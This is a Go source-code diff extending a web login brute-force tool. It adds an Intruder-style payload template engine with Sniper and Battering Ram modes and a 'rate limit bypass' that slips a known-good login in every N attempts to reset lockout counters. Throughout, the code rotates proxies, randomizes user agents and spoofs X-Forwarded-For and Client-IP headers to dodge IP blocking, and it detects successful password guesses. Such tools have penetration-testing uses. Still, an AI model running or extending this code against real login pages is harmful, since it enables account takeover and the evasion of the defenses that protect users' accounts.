@@ -2,14 +2,13 @@ package proxy
 
 import (
 	"bufio"
-	"bytes"
-	"encoding/json"
 	"fmt"
 	"io"
 	"net/http"
 	"net/url"
 	"os"
 	"regexp"
+	"sort"
 	"strings"
 	"sync"
 	"time"
@@ -21,6 +20,7 @@ func init() {
 }
 
 type AttackConfig struct {
+	Method       string // "GET", "POST", etc.
 	TargetURL    string
 	Username     string
 	Wordlist     string
@@ -41,6 +41,10 @@ type AttackConfig struct {
 	ProxyList      string // Path to proxy list file
 	RandomUA       bool   // Use random user agents
 	RandomIP       bool   // Use random IP headers (X-Forwarded-For)
+	ResetCount     int    // Rate limit bypass: inject reset job every N attempts
+	ResetUser      string // User to use for reset
+	ResetPass      string // Password to use for reset
+	AttackType     string // "Sniper", "Battering Ram"
 }
 
 var userAgents = []string{
@@ -57,37 +61,328 @@ func randomIP() string {
 }
 
 type AttackProgressMsg struct {
-	AttemptCount int
-	Password     string
-	Status       string // "Running", "Success", "Failed", "Error"
-	FinalURL     string
-	ResponseBody string
-	ErrorMsg     string
+	AttemptCount  int
+	Password      string
+	Status        string // "Running", "Success", "Failed", "Error"
+	StatusCode    int
+	ContentLength int
+	FinalURL      string
+	ResponseBody  string
+	ErrorMsg      string
+	IsReset       bool
 }
 
 type attackJob struct {
-	password string
-	attempt  int
+	payloadMap map[int]string
+	username   string
+	password   string
+	attempt    int
+	isReset    bool
 }
 
 type attackResult struct {
-	password string
-	attempt  int
-	success  bool
-	finalURL string
-	respBody string
-	err      error
+	password      string
+	attempt       int
+	success       bool
+	statusCode    int
+	contentLength int
+	err           error
+	finalURL      string
+	respBody      string
+	isReset       bool
+}
+
+// ── Template Engine & Helpers ──────────────────────────────────────────
+
+type templatePart struct {
+	segments []string
+}
+
+func (tp templatePart) reconstruct(globalIndices []int, allPayloads map[int]string) string {
+	var sb strings.Builder
+	for i, seg := range tp.segments {
+		if i%2 == 0 {
+			sb.WriteString(seg)
+		} else {
+			globalIdx := globalIndices[i/2]
+			if p, ok := allPayloads[globalIdx]; ok {
+				sb.WriteString(p)
+			} else {
+				sb.WriteString(seg)
+			}
+		}
+	}
+	return sb.String()
+}
+
+type PlaceholderRef struct {
+	PartType     string // "url", "body", "header"
+	HeaderKey    string
+	LocalIndex   int
+	DefaultValue string
+}
+
+type TemplateEngine struct {
+	URLPart    templatePart
+	URLIndices []int
+
+	BodyPart    templatePart
+	BodyIndices []int
+
+	HeaderParts   map[string]templatePart
+	HeaderIndices map[string][]int
+
+	Placeholders []PlaceholderRef
+}
+
+func NewTemplateEngine(targetURL string, headers map[string]string, body string) *TemplateEngine {
+	engine := &TemplateEngine{
+		HeaderParts:   make(map[string]templatePart),
+		HeaderIndices: make(map[string][]int),
+	}
+
+	globalCount := 0
+
+	// 1. URL
+	urlSegs := strings.Split(targetURL, "§")
+	engine.URLPart = templatePart{segments: urlSegs}
+	for i := 1; i < len(urlSegs); i += 2 {
+		engine.URLIndices = append(engine.URLIndices, globalCount)
+		engine.Placeholders = append(engine.Placeholders, PlaceholderRef{
+			PartType:     "url",
+			LocalIndex:   i,
+			DefaultValue: urlSegs[i],
+		})
+		globalCount++
+	}
+
+	// 2. Headers
+	var headerKeys []string
+	for k := range headers {
+		headerKeys = append(headerKeys, k)
+	}
+	sort.Strings(headerKeys)
+
+	for _, k := range headerKeys {
+		v := headers[k]
+		if strings.Contains(v, "§") {
+			segs := strings.Split(v, "§")
+			engine.HeaderParts[k] = templatePart{segments: segs}
+			var indices []int
+			for i := 1; i < len(segs); i += 2 {
+				indices = append(indices, globalCount)
+				engine.Placeholders = append(engine.Placeholders, PlaceholderRef{
+					PartType:     "header",
+					HeaderKey:    k,
+					LocalIndex:   i,
+					DefaultValue: segs[i],
+				})
+				globalCount++
+			}
+			engine.HeaderIndices[k] = indices
+		}
+	}
+
+	// 3. Body
+	bodySegs := strings.Split(body, "§")
+	engine.BodyPart = templatePart{segments: bodySegs}
+	for i := 1; i < len(bodySegs); i += 2 {
+		engine.BodyIndices = append(engine.BodyIndices, globalCount)
+		engine.Placeholders = append(engine.Placeholders, PlaceholderRef{
+			PartType:     "body",
+			LocalIndex:   i,
+			DefaultValue: bodySegs[i],
+		})
+		globalCount++
+	}
+
+	return engine
+}
+
+func (te *TemplateEngine) Reconstruct(allPayloads map[int]string, headers map[string]string) (string, map[string]string, string) {
+	urlStr := te.URLPart.reconstruct(te.URLIndices, allPayloads)
+
+	newHeaders := make(map[string]string)
+	for k, v := range headers {
+		if part, ok := te.HeaderParts[k]; ok {
+			newHeaders[k] = part.reconstruct(te.HeaderIndices[k], allPayloads)
+		} else {
+			newHeaders[k] = v
+		}
+	}
+
+	bodyStr := te.BodyPart.reconstruct(te.BodyIndices, allPayloads)
+
+	return urlStr, newHeaders, bodyStr
+}
+
+func InjectAutoMarkers(config *AttackConfig) {
+	body := config.OriginalBody
+
+	hasMarkers := strings.Contains(config.TargetURL, "§") || strings.Contains(body, "§")
+	if !hasMarkers {
+		for _, v := range config.Headers {
+			if strings.Contains(v, "§") {
+				hasMarkers = true
+				break
+			}
+		}
+	}
+	if hasMarkers {
+		return
+	}
+
+	// Inject in Body
+	if config.UserField != "[MANUEL]" && config.UserField != "" {
+		reForm := regexp.MustCompile(fmt.Sprintf(`(%s)=([^&]*)`, regexp.QuoteMeta(config.UserField)))
+		if reForm.MatchString(body) {
+			body = reForm.ReplaceAllString(body, fmt.Sprintf("${1}=§${2}§"))
+		} else {
+			reJson := regexp.MustCompile(fmt.Sprintf(`"%s"\s*:\s*"([^"]*)"`, regexp.QuoteMeta(config.UserField)))
+			body = reJson.ReplaceAllString(body, fmt.Sprintf(`"%s":"§${1}§"`, config.UserField))
+		}
+	}
+
+	if config.PassField != "[MANUEL]" && config.PassField != "" {
+		reForm := regexp.MustCompile(fmt.Sprintf(`(%s)=([^&]*)`, regexp.QuoteMeta(config.PassField)))
+		if reForm.MatchString(body) {
+			body = reForm.ReplaceAllString(body, fmt.Sprintf("${1}=§${2}§"))
+		} else {
+			reJson := regexp.MustCompile(fmt.Sprintf(`"%s"\s*:\s*"([^"]*)"`, regexp.QuoteMeta(config.PassField)))
+			body = reJson.ReplaceAllString(body, fmt.Sprintf(`"%s":"§${1}§"`, config.PassField))
+		}
+	}
+
+	config.OriginalBody = body
+
+	// Inject in TargetURL query parameters
+	if config.UserField != "[MANUEL]" && config.UserField != "" {
+		reForm := regexp.MustCompile(fmt.Sprintf(`([?&]%s)=([^&]*)`, regexp.QuoteMeta(config.UserField)))
+		if reForm.MatchString(config.TargetURL) {
+			config.TargetURL = reForm.ReplaceAllString(config.TargetURL, fmt.Sprintf("${1}=§${2}§"))
+		}
+	}
+	if config.PassField != "[MANUEL]" && config.PassField != "" {
+		reForm := regexp.MustCompile(fmt.Sprintf(`([?&]%s)=([^&]*)`, regexp.QuoteMeta(config.PassField)))
+		if reForm.MatchString(config.TargetURL) {
+			config.TargetURL = reForm.ReplaceAllString(config.TargetURL, fmt.Sprintf("${1}=§${2}§"))
+		}
+	}
+}
+
+func LoadPayloads(wordlist string, charset string, maxLen int) ([]string, error) {
+	if wordlist != "" {
+		file, err := os.Open(wordlist)
+		if err != nil {
+			return nil, err
+		}
+		defer file.Close()
+		var list []string
+		scanner := bufio.NewScanner(file)
+		for scanner.Scan() {
+			val := strings.TrimSpace(scanner.Text())
+			if val != "" {
+				list = append(list, val)
+			}
+		}
+		return list, scanner.Err()
+	}
+
+	var list []string
+	chars := []rune(charset)
+	if len(chars) == 0 {
+		return []string{""}, nil
+	}
+	var generate func(prefix string, length int)
+	generate = func(prefix string, length int) {
+		if length == 0 {
+			list = append(list, prefix)
+			return
+		}
+		for _, c := range chars {
+			generate(prefix+string(c), length-1)
+		}
+	}
+
+	totalEst := 0
+	for l := 1; l <= maxLen; l++ {
+		term := 1
+		for i := 0; i < l; i++ {
+			term *= len(chars)
+			if term > 100000 {
+				break
+			}
+		}
+		totalEst += term
+	}
+	if totalEst > 100000 {
+		maxLen = 3
+	}
+
+	for l := 1; l <= maxLen; l++ {
+		generate("", l)
+	}
+	return list, nil
+}
+
+func GenerateJobs(engine *TemplateEngine, payloads1 []string, payloads2 []string, attackType string, jobsChan chan<- attackJob, cancelChan <-chan bool) {
+	P := len(engine.Placeholders)
+	if P == 0 {
+		return
+	}
+
+	isCancelled := func() bool {
+		select {
+		case <-cancelChan:
+			return true
+		default:
+			return false
+		}
+	}
+
+	attemptCount := 0
+
+	switch attackType {
+	case "Sniper":
+		for j := 0; j < P; j++ {
+			for _, p := range payloads1 {
+				if isCancelled() {
+					return
+				}
+				attemptCount++
+				payloadMap := make(map[int]string)
+				payloadMap[j] = p
+				jobsChan <- attackJob{
+					payloadMap: payloadMap,
+					attempt:    attemptCount,
+					password:   p,
+				}
+			}
+		}
+
+	case "Battering Ram":
+		for _, p := range payloads1 {
+			if isCancelled() {
+				return
+			}
+			attemptCount++
+			payloadMap := make(map[int]string)
+			for j := 0; j < P; j++ {
+				payloadMap[j] = p
+			}
+			jobsChan <- attackJob{
+				payloadMap: payloadMap,
+				attempt:    attemptCount,
+				password:   p,
+			}
+		}
+	}
 }
 
 func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg, cancelChan <-chan bool) {
-	// fmt.Printf("[Attack] Starting for target: %s\n", config.TargetURL)
-	if config.UserField == "" {
-		config.UserField = "username"
-	}
-	if config.PassField == "" {
-		config.PassField = "password"
-	}
-	// fmt.Printf("[Attack] Config - UserField: %s, PassField: %s, Concurrency: %d\n", config.UserField, config.PassField, config.Concurrency)
+	defer close(updateChan)
+	InjectAutoMarkers(&config)
+
 	if config.Concurrency <= 0 {
 		config.Concurrency = 1
 	}
@@ -95,22 +390,13 @@ func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg, c
 		config.GenCharset = "abcdefghijklmnopqrstuvwxyz0123456789"
 	}
 	if config.GenMaxLen <= 0 {
-		config.GenMaxLen = 4 // Default safety limit
+		config.GenMaxLen = 4
+	}
+	if config.AttackType == "" {
+		config.AttackType = "Sniper"
 	}
 
-	var scanner *bufio.Scanner
-	var file *os.File
 	var err error
-	if config.Wordlist != "" {
-		file, err = os.Open(config.Wordlist)
-		if err != nil {
-			updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: fmt.Sprintf("Error opening wordlist: %v", err)}
-			return
-		}
-		defer file.Close()
-		scanner = bufio.NewScanner(file)
-	}
-
 	var successRegex *regexp.Regexp
 	if config.SuccessRegex != "" {
 		successRegex, err = regexp.Compile(config.SuccessRegex)
@@ -120,13 +406,24 @@ func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg, c
 		}
 	}
 
-	jobs := make(chan attackJob, config.Concurrency*2)
+	payloads1, err := LoadPayloads(config.Wordlist, config.GenCharset, config.GenMaxLen)
+	if err != nil {
+		updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: fmt.Sprintf("Error loading Payload Set 1: %v", err)}
+		return
+	}
+
+	engine := NewTemplateEngine(config.TargetURL, config.Headers, config.OriginalBody)
+	if len(engine.Placeholders) == 0 {
+		updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: "No placeholders/markers (§) found in Target URL, Headers, or Request Body."}
+		return
+	}
+
+	jobs := make(chan attackJob, config.Concurrency)
 	results := make(chan attackResult)
 	done := make(chan bool)
 
 	var wg sync.WaitGroup
 
-	// Load proxies if provided
 	var proxies []*url.URL
 	if config.ProxyList != "" {
 		pfile, err := os.Open(config.ProxyList)
@@ -144,7 +441,6 @@ func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg, c
 	var proxyIndex int
 	var pmu sync.Mutex
 
-	// Shared transport for connection pooling - dynamically scaled with Concurrency for massive speed boost
 	transport := &http.Client{
 		Transport: &http.Transport{
 			MaxIdleConns:        config.Concurrency * 2,
@@ -168,11 +464,10 @@ func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg, c
 		},
 	}
 
-	// CLI modundan veya boş başlatılan durumlarda Default Header ayarlaması (Concurrent Map Write Panic'i önlemek için worker öncesi yapılır)
-	if config.OriginalBody == "" {
-		if config.Headers == nil {
-			config.Headers = make(map[string]string)
-		}
+	if config.Headers == nil {
+		config.Headers = make(map[string]string)
+	}
+	if _, ok := config.Headers["Content-Type"]; !ok {
 		if config.IsJSON {
 			config.Headers["Content-Type"] = "application/json"
 		} else {
@@ -180,84 +475,61 @@ func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg, c
 		}
 	}
 
-	// Workers
-	// fmt.Printf("[Attack] Spawning %d workers...\n", config.Concurrency)
 	for w := 0; w < config.Concurrency; w++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			for {
+			for job := range jobs {
 				select {
 				case <-cancelChan:
-					return // İptal edildiyse worker'dan çık
-				case job, ok := <-jobs:
-					if !ok { return } // jobs kanalı kapandıysa çık
-					
-					res := attackResult{password: job.password, attempt: job.attempt}
-
-				var reqBody io.Reader
-				
-				// Orijinal Body'i kullan (Auto-Injection)
-				payloadStr := config.OriginalBody
-				
-				// Eğer "[MANUEL]" seçilmediyse ve orijinal body varsa, dinamik olarak değiştir
-				if config.UserField != "[MANUEL]" && config.UserField != "" {
-					// Çok basit bir string replace. Profesyonel araçlarda genelde regex ile tam eşleşme yapılır
-					// ama şimdilik hedef alana ait = değerinin sonrasını bulup değiştiriyoruz.
-					// Örn: username=eski_deger -> username=admin
-					re := regexp.MustCompile(fmt.Sprintf(`(%s)=([^&]+)`, regexp.QuoteMeta(config.UserField)))
-					payloadStr = re.ReplaceAllString(payloadStr, fmt.Sprintf("${1}=%s", url.QueryEscape(config.Username)))
-
-					// JSON için çok kaba bir yaklaşım (Gerçekte AST veya Unmarshal/Marshal gerekir ama şimdilik string replace)
-					reJson := regexp.MustCompile(fmt.Sprintf(`"%s"\s*:\s*"[^"]*"`, regexp.QuoteMeta(config.UserField)))
-					payloadStr = reJson.ReplaceAllString(payloadStr, fmt.Sprintf(`"%s":"%s"`, config.UserField, config.Username))
+					return
+				default:
 				}
 
-				if config.PassField != "[MANUEL]" && config.PassField != "" {
-					re := regexp.MustCompile(fmt.Sprintf(`(%s)=([^&]+)`, regexp.QuoteMeta(config.PassField)))
-					payloadStr = re.ReplaceAllString(payloadStr, fmt.Sprintf("${1}=%s", url.QueryEscape(job.password)))
-
-					reJson := regexp.MustCompile(fmt.Sprintf(`"%s"\s*:\s*"[^"]*"`, regexp.QuoteMeta(config.PassField)))
-					payloadStr = reJson.ReplaceAllString(payloadStr, fmt.Sprintf(`"%s":"%s"`, config.PassField, job.password))
+				res := attackResult{
+					password: job.password,
+					attempt:  job.attempt,
+					isReset:  job.isReset,
 				}
 
-				// Eğer tamamen boşsa veya "Manuel" modundaysak fallback (Eski sistem)
-				if payloadStr == "" {
-					if config.IsJSON {
-						payload := map[string]string{
-							config.UserField: config.Username,
-							config.PassField: job.password,
+				var reqURL string
+				var reqHeaders map[string]string
+				var reqBody string
+
+				if job.isReset {
+					resetPayload := make(map[int]string)
+					for j := range engine.Placeholders {
+						if j%2 == 0 {
+							resetPayload[j] = config.ResetUser
+						} else {
+							resetPayload[j] = config.ResetPass
 						}
-						jsonBytes, _ := json.Marshal(payload)
-						reqBody = bytes.NewReader(jsonBytes)
-					} else {
-						data := url.Values{}
-						data.Set(config.UserField, config.Username)
-						data.Set(config.PassField, job.password)
-						reqBody = strings.NewReader(data.Encode())
 					}
+					reqURL, reqHeaders, reqBody = engine.Reconstruct(resetPayload, config.Headers)
 				} else {
-					reqBody = strings.NewReader(payloadStr)
+					reqURL, reqHeaders, reqBody = engine.Reconstruct(job.payloadMap, config.Headers)
 				}
 
-				// Max 3 retries for transient errors or rate limits
 				success := false
 				for retry := 0; retry < 3; retry++ {
-					req, err := http.NewRequest("POST", config.TargetURL, reqBody)
+					select {
+					case <-cancelChan:
+						return
+					default:
+					}
+
+					method := config.Method
+					if method == "" {
+						method = "POST"
+					}
+					req, err := http.NewRequest(method, reqURL, strings.NewReader(reqBody))
 					if err != nil {
 						res.err = err
 						break
 					}
-					
-					// Eski sistem Content-Type'ı ekliyordu, yeni sistemde Headers map'inden geliyor zaten.
-					if contentType, ok := config.Headers["Content-Type"]; ok && config.Headers != nil {
-						// Content type already set in headers loop below
-						_ = contentType
-					}
 
-					// Orijinal Headerları Set Et
-					if config.Headers != nil {
-						for k, v := range config.Headers {
+					if reqHeaders != nil {
+						for k, v := range reqHeaders {
 							if strings.ToLower(k) == "host" {
 								req.Host = v
 							} else {
@@ -277,20 +549,13 @@ func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg, c
 						req.Header.Set("Client-IP", ip)
 					}
 
-					// If we need to retry, we must recreate the body reader
-					if retry > 0 {
-						req.Body = io.NopCloser(strings.NewReader(payloadStr))
-					}
-
 					resp, err := transport.Do(req)
 					if err != nil {
 						res.err = err
-						// Ağ hatası veya TCP limitlemesi olursa çok kısa bekle
 						time.Sleep(100 * time.Millisecond)
 						continue
 					}
 
-					// Check for rate limiting
 					if resp.StatusCode == 429 {
 						resp.Body.Close()
 						time.Sleep(5 * time.Second)
@@ -300,35 +565,39 @@ func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg, c
 					bodyBytes, _ := io.ReadAll(resp.Body)
 					resp.Body.Close()
 
-					res.finalURL = resp.Request.URL.String()
-					
-					// Success detection logic
-					if config.ExpectedStatus > 0 {
-						match := resp.StatusCode == config.ExpectedStatus
-						if config.StatusIsSuccess {
-							res.success = match
-						} else {
-							res.success = !match
-						}
-					} else if resp.StatusCode == 302 || resp.StatusCode == 301 {
-						res.success = true
-						res.finalURL = resp.Header.Get("Location")
-					} else if successRegex != nil {
-						if successRegex.Match(bodyBytes) {
+					res.statusCode = resp.StatusCode
+					res.contentLength = len(bodyBytes)
+
+					if !job.isReset {
+						res.finalURL = resp.Request.URL.String()
+
+						if config.ExpectedStatus > 0 {
+							match := resp.StatusCode == config.ExpectedStatus
+							if config.StatusIsSuccess {
+								res.success = match
+							} else {
+								res.success = !match
+							}
+						} else if resp.StatusCode == 302 || resp.StatusCode == 301 {
 							res.success = true
-						}
-					} else {
-						bodyStr := strings.ToLower(string(bodyBytes))
-						if resp.StatusCode >= 200 && resp.StatusCode < 300 {
-							if !strings.Contains(bodyStr, "incorrect") && 
-							   !strings.Contains(bodyStr, "invalid") && 
-							   !strings.Contains(bodyStr, "failed") &&
-							   !strings.Contains(bodyStr, "hatal") { // hatalı, hatali vs
+							res.finalURL = resp.Header.Get("Location")
+						} else if successRegex != nil {
+							if successRegex.Match(bodyBytes) {
 								res.success = true
+							}
+						} else {
+							bodyStr := strings.ToLower(string(bodyBytes))
+							if resp.StatusCode >= 200 && resp.StatusCode < 300 {
+								if !strings.Contains(bodyStr, "incorrect") &&
+									!strings.Contains(bodyStr, "invalid") &&
+									!strings.Contains(bodyStr, "failed") &&
+									!strings.Contains(bodyStr, "hatal") {
+									res.success = true
+								}
 							}
 						}
 					}
-					
+
 					if res.success {
 						snippet := strings.TrimSpace(string(bodyBytes))
 						if len(snippet) > 80 {
@@ -338,35 +607,43 @@ func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg, c
 					}
 
 					success = true
-					break // Successfully processed (win or lose)
+					break
 				}
 
 				if !success && res.err == nil {
 					res.err = fmt.Errorf("failed after retries (rate limited or server error)")
 				}
 
-				results <- res
+				select {
+				case <-cancelChan:
+					return
+				case results <- res:
+				}
 
-				// Delay logic with Jitter
 				if config.DelayMs > 0 {
-					// Add random jitter (±20%)
 					jitter := 0
 					if config.DelayMs > 10 {
 						jitter = (time.Now().Nanosecond() % (config.DelayMs / 5)) - (config.DelayMs / 10)
 					}
-					time.Sleep(time.Duration(config.DelayMs+jitter) * time.Millisecond)
-				}
-				if config.BatchSize > 0 && job.attempt % config.BatchSize == 0 {
-					if config.BatchDelayMs > 0 {
-						time.Sleep(time.Duration(config.BatchDelayMs) * time.Millisecond)
+					select {
+					case <-cancelChan:
+						return
+					case <-time.After(time.Duration(config.DelayMs+jitter) * time.Millisecond):
 					}
 				}
-				} // end select
-			} // end for
+				if config.BatchSize > 0 && job.attempt%config.BatchSize == 0 {
+					if config.BatchDelayMs > 0 {
+						select {
+						case <-cancelChan:
+							return
+						case <-time.After(time.Duration(config.BatchDelayMs) * time.Millisecond):
+						}
+					}
+				}
+			}
 		}()
 	}
 
-	// Result collector with rate-limiting and block detection
 	var finalResult *attackResult
 	go func() {
 		lastUpdate := time.Now()
@@ -374,25 +651,35 @@ func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg, c
 		for res := range results {
 			if res.err != nil {
 				errorCount++
-				if errorCount > 50 { // Stop if too many errors
+				if errorCount > 50 {
 					updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: "Too many errors. Server might be blocking us."}
-					// Note: workers will eventually finish or we could signal them
 				}
 			} else {
-				errorCount = 0 // Reset on success
+				errorCount = 0
 			}
 
 			if res.success && finalResult == nil {
 				fr := res
 				finalResult = &fr
+				// Force immediate update to UI on success
+				updateChan <- AttackProgressMsg{
+					AttemptCount:  res.attempt,
+					Password:      res.password,
+					Status:        "Running",
+					StatusCode:    res.statusCode,
+					ContentLength: res.contentLength,
+					IsReset:       res.isReset,
+				}
 			}
-			
-			// Only update UI every 100ms to avoid overwhelming it
+
 			if finalResult == nil && time.Since(lastUpdate) > 100*time.Millisecond {
 				updateChan <- AttackProgressMsg{
-					AttemptCount: res.attempt,
-					Password:     res.password,
-					Status:       "Running",
+					AttemptCount:  res.attempt,
+					Password:      res.password,
+					Status:        "Running",
+					StatusCode:    res.statusCode,
+					ContentLength: res.contentLength,
+					IsReset:       res.isReset,
 				}
 				lastUpdate = time.Now()
 			}
@@ -400,61 +687,11 @@ func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg, c
 		done <- true
 	}()
 
-	// Scanner or Generator
-	attemptCount := 0
-	if config.Wordlist != "" {
-		// fmt.Printf("[Attack] Using wordlist: %s\n", config.Wordlist)
-		file, err = os.Open(config.Wordlist)
-		if err != nil {
-			// fmt.Printf("[Attack] Error opening wordlist: %v\n", err)
-			updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: fmt.Sprintf("Error opening wordlist: %v", err)}
-			return
-		}
-		defer file.Close()
-		scanner = bufio.NewScanner(file)
-	}
+	go func() {
+		defer close(jobs)
+		GenerateJobs(engine, payloads1, nil, config.AttackType, jobs, cancelChan)
+	}()
 
-	if scanner != nil {
-		for scanner.Scan() {
-			if finalResult != nil { break }
-			
-			// Her adımda iptali kontrol et
-			select {
-			case <-cancelChan:
-				close(jobs)
-				wg.Wait()
-				return
-			default:
-			}
-
-			password := strings.TrimSpace(scanner.Text())
-			if password == "" { continue }
-			attemptCount++
-			jobs <- attackJob{password: password, attempt: attemptCount}
-		}
-	} else {
-		// fmt.Printf("[Attack] No wordlist, starting auto-generation (MaxLen: %d)...\n", config.GenMaxLen)
-		// Generate combinations
-		chars := []rune(config.GenCharset)
-		var generate func(prefix string, length int) bool
-		generate = func(prefix string, length int) bool {
-			if length == 0 {
-				if finalResult != nil { return true }
-				attemptCount++
-				jobs <- attackJob{password: prefix, attempt: attemptCount}
-				return false
-			}
-			for _, c := range chars {
-				if generate(prefix+string(c), length-1) { return true }
-			}
-			return false
-		}
-
-		for l := 1; l <= config.GenMaxLen; l++ {
-			if generate("", l) { break }
-		}
-	}
-	close(jobs)
 	wg.Wait()
 	close(results)
 	<-done
@@ -470,41 +707,23 @@ func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg, c
 		return
 	}
 
-	if scanner != nil {
-		if err := scanner.Err(); err != nil {
-			updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: fmt.Sprintf("Error reading wordlist: %v", err)}
-			return
-		}
-	}
-
 	updateChan <- AttackProgressMsg{Status: "Failed"}
 }
 
 func RunBruteForce(config AttackConfig) {
-	fmt.Println("Starting brute force attack tool...")
-	fmt.Printf("Target: %s\n", config.TargetURL)
-	fmt.Printf("Username: %s\n", config.Username)
-	fmt.Printf("Wordlist: %s\n", config.Wordlist)
-
-	// Provide empty maps for CLI fallback to prevent nil pointer errors
-	if config.Headers == nil {
-		config.Headers = make(map[string]string)
-	}
-	
 	updateChan := make(chan AttackProgressMsg)
-	cancelChan := make(chan bool) // Dummy cancel channel for CLI
+	cancelChan := make(chan bool)
 	go RunBruteForceUI(config, updateChan, cancelChan)
 
 	for msg := range updateChan {
 		switch msg.Status {
 		case "Running":
-			fmt.Printf("\rAttempt %d: Trying password '%s'...", msg.AttemptCount, msg.Password)
+			fmt.Printf("\rAttempt %d: Trying %s (Code: %d, Size: %d)", msg.AttemptCount, msg.Password, msg.StatusCode, msg.ContentLength)
 		case "Success":
 			fmt.Printf("\n[+] SUCCESS! Password found: %s\n", msg.Password)
-			fmt.Printf("[+] Final URL reached: %s\n", msg.FinalURL)
 			return
 		case "Failed":
-			fmt.Printf("\n[-] Attack finished. Password not found.\n")
+			fmt.Printf("\n[-] Finished. Not found.\n")
 			return
 		case "Error":
 			fmt.Printf("\n[!] Error: %s\n", msg.ErrorMsg)
@@ -512,5 +731,3 @@ func RunBruteForce(config AttackConfig) {
 		}
 	}
 }
-
-
